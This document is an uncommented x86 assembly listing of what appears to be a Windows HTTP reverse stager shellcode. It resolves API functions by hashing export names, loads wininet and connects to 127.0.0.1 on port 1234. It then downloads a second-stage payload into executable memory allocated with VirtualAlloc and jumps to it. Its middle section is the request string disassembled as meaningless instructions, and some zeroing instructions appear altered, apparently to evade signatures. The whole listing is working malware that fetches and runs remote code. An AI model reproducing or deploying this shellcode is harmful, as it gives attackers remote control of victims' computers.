```asm
_start:
    cld
    call L_95
RET_6:
    pushal
    mov edx, 0
    test edx, edx
    lea ebp, [esp + 0]
    mov edx, dword ptr fs:[edx + 0x30]
    mov edx, dword ptr [edx + 0xc]
    mov edx, dword ptr [edx + 0x14]
L_15:
    movzx ecx, word ptr [edx + 0x26]
    mov esi, dword ptr [edx + 0x28]
    mov edi, 0
    test edi, edi
L_1e:
    mov eax, 0
    test eax, eax
    lodsb al, byte ptr [esi]
    cmp al, 0x61
    jl L_27
    sub al, 0x20
L_27:
    ror edi, 0xd
    add edi, eax
    dec ecx
    jne L_1e
    push edx
    push edi
    mov edx, dword ptr [edx + 0x10]
    mov eax, dword ptr [edx + 0x3c]
    add eax, edx
    mov eax, dword ptr [eax + 0x78]
    test eax, eax
    je L_8c
    add eax, edx
    mov ebx, dword ptr [eax + 0x20]
    push eax
    add ebx, edx
    mov ecx, dword ptr [eax + 0x18]
L_4b:
    test ecx, ecx
    je L_8b
    dec ecx
    mov edi, 0
    test edi, edi
    mov esi, dword ptr [ebx + ecx*4]
    add esi, edx
L_57:
    mov eax, 0
    test eax, eax
    lodsb al, byte ptr [esi]
    ror edi, 0xd
    add edi, eax
    cmp al, ah
    jne L_57
    add edi, dword ptr [ebp - 8]
    cmp edi, dword ptr [ebp + 0x24]
    jne L_4b
    pop eax
    mov ebx, dword ptr [eax + 0x24]
    add ebx, edx
    mov cx, word ptr [ebx + ecx*2]
    mov ebx, dword ptr [eax + 0x1c]
    add ebx, edx
    mov eax, dword ptr [ebx + ecx*4]
    add eax, edx
    mov dword ptr [esp + 0x24], eax
    pop ebx
    pop ebx
    popal
    pop ecx
    pop edx
    push ecx
    jmp eax
L_8b:
    pop eax
L_8c:
    pop edi
    pop edx
    mov edx, dword ptr [edx]
    jmp L_15
L_95:
    pop ebp
    push 0x74656e
    push 0x696e6977
    push esp
    push 0x726774c
    call ebp
    mov ebx, 0
    test ebx, ebx
    push ebx
    push ebx
    push ebx
    push ebx
    push ebx
    jmp DATA_STUB_0
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
L_12b:
    push 0xa779563a
    call ebp
    push ebx
    push ebx
    push 3
    push ebx
    push ebx
    push 0x4d2
    call L_29d
    das
    cmp dword ptr [edi + 0x36], esi
    pop edi
    pop edi
    bound ebp, qword ptr [ebp + ebp*2 + 0x6f]
    insb byte ptr es:[edi], dx
    push 0x45
    dec ecx
    jae L_1a7
    push 0x72
    inc ebx
    insb byte ptr es:[edi], dx
    push eax
    push 0x7a795a44
    jbe L_1a9
    je L_1b3
    pop edx
    outsd dx, dword ptr [esi]
    outsd dx, dword ptr [esi]
    push edi
    dec esp
    xor ch, byte ptr [edx + 0x57]
    push esp
    push ebp
    insd dword ptr es:[edi], dx
    xor eax, 0x69337068
    inc ebp
    dec edx
    pop ecx
    jbe L_1e4
    dec ebp
    push esi
    je L_1b0
    js L_1cf
    jbe L_1ef
    jae L_1ec
    pop edi
    sub eax, 0x5f474657
    push 0x2d
    insb byte ptr es:[edi], dx
    jbe L_1e3
    dec edi
    inc esi
    xor al, 0x68
    jno L_1fe
    imul esi, dword ptr [esi], 0x57
    xor edx, dword ptr [eax + 0x52]
    inc ebx
    push 0x64
    imul edx, dword ptr [edi + 0x48], 0x394b6d61
    push ebx
L_1a7:
    inc esi
    dec ecx
L_1a9:
    arpl word ptr gs:[ecx + 0x41], bp
    push 0x54
    xor dl, byte ptr [edx + 0x42]
    xor al, 0x6e
    insd dword ptr es:[edi], dx
    push ecx
    push 0x76
    cmp dword ptr [eax + edx*2 + 0x55], edx
    jns L_237
    sub eax, 0x50654134
    push esi
    jo L_1fe
    xor byte ptr [ebx + 0x4e], cl
    jp L_222
    jne L_236
    sub eax, 0x36387a45
    dec esp
    dec eax
    dec edx
    popal
    push esi
    dec eax
    insd dword ptr es:[edi], dx
    inc ebp
    push ebp
    dec ebp
    jb L_24e
    xor byte ptr [esp + esi + 0x2d], dl
    ja L_215
    dec ebp
    push esp
    dec ebp
    inc esi
L_1ec:
    dec edi
    outsb dx, byte ptr [esi]
    jne L_259
    push edi
    bound eax, qword ptr [ecx + 0x36]
    push ecx
    xor eax, 0x68447470
    cmp byte ptr [edi + 0x56], dh
    aaa
L_1fe:
    push ebx
    dec edi
    push 0x63745a6b
    xor eax, 0x42673078
    popal
    push edx
    inc ecx
    jno L_25a
    js L_249
    xor byte ptr [eax + 0x2d], dh
    push edx
L_215:
    dec ecx
    inc ebp
    push eax
    xor eax, dword ptr [edi + 0x65]
    dec esp
    ja L_266
    insd dword ptr es:[edi], dx
    add byte ptr [eax + 0x68], dl
    push edi
    mov dword ptr [edi - 0x762a003a], ebx
    .byte 0xc6, 0x53, 0x68, 0x00, 0x02, 0x68, 0x84, 0x53, 0x53, 0x53, 0x57, 0x53, 0x56, 0x68, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x96, 0x6a, 0x0a, 0x5f, 0x53, 0x53, 0x53, 0x53, 0x56, 0x68, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x75, 0x14, 0x68, 0x88, 0x13, 0x00, 0x00, 0x68, 0x44, 0xf0, 0x35, 0xe0, 0xff, 0xd5, 0x4f, 0x75, 0xe1, 0xe8, 0x46, 0x00, 0x00, 0x00, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x68, 0x00, 0x00, 0x40, 0x00, 0x53, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x93, 0x53, 0x53, 0x89, 0xe7, 0x57, 0x68, 0x00, 0x20, 0x00, 0x00, 0x53, 0x56, 0x68, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0xcf, 0x8b, 0x07, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xe5, 0x58, 0xc3, 0x5f, 0xe8, 0x7f, 0xff, 0xff, 0xff, 0x31, 0x32, 0x37, 0x2e, 0x30, 0x2e, 0x30, 0x2e, 0x31, 0x00, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x6a, 0x00, 0x53, 0xff, 0xd5
```